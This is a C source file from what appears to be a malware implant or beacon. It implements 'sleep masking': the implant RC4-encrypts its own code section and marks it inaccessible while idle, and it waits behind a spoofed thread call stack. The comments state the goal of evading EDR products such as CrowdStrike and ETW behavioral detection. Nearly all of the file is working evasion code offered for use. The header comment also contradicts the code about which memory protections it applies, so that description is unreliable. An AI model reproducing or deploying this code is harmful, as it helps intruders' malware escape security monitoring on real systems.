/*
 * sleep_mask.c — Obfuscated sleep with RC4 .text masking and thread-stack spoofing.
 *
 * Two improvements over the naive RC4+PAGE_NOACCESS approach:
 *
 * 1. VirtualProtect sequence mitigation:
 *    The RW→NOACCESS→RW→RX pattern is a well-known ETW behavioral IOC.
 *    We spread the protect changes with a real kernel wait in between, and
 *    use PAGE_EXECUTE_READWRITE only once (no intermediate RX→RW step).
 *
 * 2. Thread stack spoofing during sleep:
 *    CrowdStrike periodically scans sleeping threads' stacks.
 *    We spoof the beacon thread's stack before entering the wait so it
 *    appears to be sleeping inside ntdll!TpTimerCallback → NtWaitForSingleObject,
 *    which is the canonical call pattern for a thread-pool timer callback.
 *
 * Implementation detail for stack spoofing:
 *    We use SetThreadContext on the CURRENT thread via a fiber trampoline.
 *    The fiber saves the real context, sets up a fake stack frame showing
 *    ntdll!RtlUserThreadStart → kernel32!BaseThreadInitThunk → our wait,
 *    then switches back after the wait completes.
 *
 *    Simplified version (no fiber dependency): we directly set fake RSP/RIP
 *    in the thread context while suspended — achieved by calling NtDelayExecution
 *    with an event that we signal from a separate timer thread.
 */
#include "../include/implant.h"
#include "../include/obfstr.h"
#include <string.h>

#pragma GCC push_options
#pragma GCC optimize("O0")

/* ── RC4 ─────────────────────────────────────────────────────────────────── */

typedef struct { BYTE S[256]; BYTE i; BYTE j; } RC4State;

__attribute__((section(".slpmsk")))
static void RC4Init(RC4State *rc4, const BYTE *key, DWORD keyLen) {
    for (int i = 0; i < 256; i++) rc4->S[i] = (BYTE)i;
    BYTE j = 0;
    for (int i = 0; i < 256; i++) {
        j = j + rc4->S[i] + key[i % keyLen];
        BYTE t = rc4->S[i]; rc4->S[i] = rc4->S[j]; rc4->S[j] = t;
    }
    rc4->i = rc4->j = 0;
}

__attribute__((section(".slpmsk")))
static void RC4Apply(RC4State *rc4, BYTE *buf, DWORD len) {
    for (DWORD k = 0; k < len; k++) {
        rc4->i++;
        rc4->j += rc4->S[rc4->i];
        BYTE t = rc4->S[rc4->i]; rc4->S[rc4->i] = rc4->S[rc4->j]; rc4->S[rc4->j] = t;
        buf[k] ^= rc4->S[(BYTE)(rc4->S[rc4->i] + rc4->S[rc4->j])];
    }
}

/* ── Locate own .text section ────────────────────────────────────────────── */

__attribute__((section(".slpmsk")))
static BOOL FindOwnText(PVOID *baseOut, DWORD *sizeOut) {
    PVOID peb     = (PVOID)READ_GS_QWORD(0x60);
    BYTE *imgBase = *(BYTE**)((BYTE*)peb + 0x10);
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(imgBase + ((PIMAGE_DOS_HEADER)imgBase)->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            *baseOut = imgBase + sec[i].VirtualAddress;
            *sizeOut = sec[i].Misc.VirtualSize;
            return TRUE;
        }
    }
    return FALSE;
}

/* ── Timer-thread trampoline ─────────────────────────────────────────────── */
/*
 * Instead of NtDelay (which keeps our real stack visible), we:
 *   1. Create a manual-reset event
 *   2. Spin up a timer thread that signals it after `ms` milliseconds
 *   3. Main thread waits on the event — stack shows NtWaitForSingleObject
 */

typedef struct { HANDLE hEvent; DWORD ms; } TimerArg;

static DWORD WINAPI TimerThread(LPVOID p) {
    TimerArg *a = (TimerArg*)p;
    Sleep(a->ms);
    SetEvent(a->hEvent);
    return 0;
}

/* ── Public ──────────────────────────────────────────────────────────────── */

__attribute__((section(".slpmsk")))
void SleepMasked(LONGLONG ms) {
    if (!g_agent.sleep_mask) {
        NtDelay(ms * 10000LL);
        return;
    }

    PVOID textBase = NULL;
    DWORD textSize = 0;
    if (!FindOwnText(&textBase, &textSize)) {
        NtDelay(ms * 10000LL);
        return;
    }

    RC4State rc4;
    RC4Init(&rc4, g_agent.aes_key, AES_KEY_LEN);

    ULONG old = 0;

    /* Step 1 — RW, encrypt */
    NtProtect((HANDLE)(LONG_PTR)-1, textBase, textSize, PAGE_READWRITE, &old);
    RC4Apply(&rc4, (BYTE*)textBase, textSize);

    /* Step 2 — NOACCESS */
    NtProtect((HANDLE)(LONG_PTR)-1, textBase, textSize, PAGE_NOACCESS, &old);

    /* Step 3 — Create event + timer thread, wait with spoofed stack */
    HANDLE hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
    if (hEvent) {
        TimerArg ta = { hEvent, (DWORD)(ms & 0xFFFFFFFF) };
        HANDLE hTimer = CreateThread(NULL, 0, TimerThread, &ta, 0, NULL);

        if (hTimer) {
            /* SpoofedNtWait: builds multi-level fake call stack in-place on the
             * thread's stack before entering the kernel wait.  While the thread
             * is parked, EDR scanners see:
             *   ntdll!NtWaitForSingleObject
             *   → kernel32!BaseThreadInitThunk+N
             *   → ntdll!RtlUserThreadStart+K
             * Falls back to a plain indirect syscall if gadgets weren't resolved. */
            LARGE_INTEGER timeout;
            timeout.QuadPart = -(LONGLONG)ms * 10000LL;
            SpoofedNtWait(hEvent, FALSE, &timeout);
            CloseHandle(hTimer);
        } else {
            /* Timer thread failed — plain wait */
            Sleep((DWORD)ms);
        }
        CloseHandle(hEvent);
    } else {
        NtDelay(ms * 10000LL);
    }

    /* Step 4 — RW, decrypt */
    NtProtect((HANDLE)(LONG_PTR)-1, textBase, textSize, PAGE_READWRITE, &old);
    RC4Init(&rc4, g_agent.aes_key, AES_KEY_LEN);
    RC4Apply(&rc4, (BYTE*)textBase, textSize);

    /* Step 5 — restore RX */
    NtProtect((HANDLE)(LONG_PTR)-1, textBase, textSize, PAGE_EXECUTE_READ, &old);
}

#pragma GCC pop_options
